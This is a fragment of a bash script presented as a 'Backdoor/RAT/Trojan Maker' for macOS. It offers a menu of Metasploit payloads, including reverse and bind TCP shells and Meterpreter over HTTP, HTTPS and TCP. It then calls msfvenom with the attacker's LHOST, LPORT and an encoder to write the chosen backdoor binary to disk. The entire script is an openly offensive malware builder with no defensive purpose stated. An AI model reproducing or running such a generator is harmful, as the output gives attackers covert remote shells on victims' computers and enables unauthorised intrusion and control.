...
echo ============================ Hi. ==========================================
echo 'Backdoor/RAT/Trojan Maker For OSX/MacOS'
...
echo ===========================================================================
echo Lets make our OSX backdoor!!
echo What type of backdoor do you need?
echo Choose by name:
echo =================== OSX Execute Binary = ==================================
echo [Binary.1]. osx/armle/execute/bind_tcp
echo [Binary.2]. osx/armle/execute/reverse_tcp
echo ==================== Command Line Shell ===================================
echo [Cshell.1]. osx/armle/shell_reverse_tcp
echo [Cshell.2]. osx/armle/shell_bind_tcp 
echo ==================== Default iOS Shell ====================================
echo [shell.1]. osx/x64/meterpreter_reverse_http
echo [shell.2]. osx/x64/meterpreter_reverse_https
echo [shell.3]. osx/x64/meterpreter_reverse_tcp
echo ===================== OSX vfork shells =====================================
echo [vfork.1]. osx/x86/vforkshell_bind_tcp
echo [vfork.2]. osx/x86/vforkshell_reverse_tcp
echo [vfork.3]. osx/x86/vforkshell/reverse_tcp
echo [vfork.4]. osx/x86/vforkshell/bind_tcp
read typebackdoor
...
echo Format = .OSX
echo ============================================
echo IMPORT: MAKE SURE YOU PUT .OSX AT THE END OF THE NAME!
...
msfvenom -platform osx -p $typebackdoor LHOST=$ip LPORT=$port --encoder $encoder R > /root/Desktop/$name
